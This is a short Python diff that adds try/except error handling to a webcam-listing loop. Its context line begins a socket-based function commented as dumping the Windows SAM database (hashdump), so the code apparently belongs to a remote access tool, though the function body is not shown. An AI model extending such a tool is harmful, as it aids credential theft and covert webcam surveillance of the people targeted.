@@ -240,16 +240,21 @@ def list_webcams():
     webcams = []
     index = 0
     while True:
-        cap = cv2.VideoCapture(index)
-        if cap.isOpened():
-            # Get the webcam name (this depends on your platform)
-            webcam_name = f"{index}: {cap.getBackendName()}"
-            webcams.append(webcam_name)
-            cap.release()
-        else:
+        try:
+            cap = cv2.VideoCapture(index)
+            if cap.isOpened():
+                # Get the webcam name (this depends on your platform)
+                webcam_name = f"{index}: {cap.getBackendName()}"
+                webcams.append(webcam_name)
+                cap.release()
+            else:
+                break
+        except Exception as e:
+            print(f"Error accessing camera at index {index}: {e}")
             break
         index += 1
     return '\n'.join(webcams)
+
 
 # Function to dump the contents of the SAM database (hashdump)
 def hashdump(client_socket):
